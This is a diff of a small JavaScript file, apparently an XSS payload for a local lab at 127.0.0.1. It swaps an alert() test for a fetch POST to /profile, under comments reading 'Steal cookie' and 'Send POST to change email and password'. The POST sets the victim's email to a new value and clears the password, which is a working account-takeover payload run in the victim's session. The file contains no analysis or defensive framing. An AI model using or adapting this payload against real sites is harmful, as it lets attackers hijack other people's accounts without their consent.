@@ -1,9 +1,14 @@
-// 
 // Target
-// 1. Navigate to profile
-// 2. Find email input and change
-// 3. Find password input and change
-// 4. Click "update profile" submit form
-// 
+// Steal cookie
+// Send POST to change email and password
 
-alert("ggelllll")
+fetch("http://127.0.0.1:5000/profile", {
+  method: "POST",
+  body: JSON.stringify({
+    email: "ABC.com",
+    password: ""
+  }),
+  headers: {
+    "Content-type": "application/json; charset=UTF-8",
+  },
+});
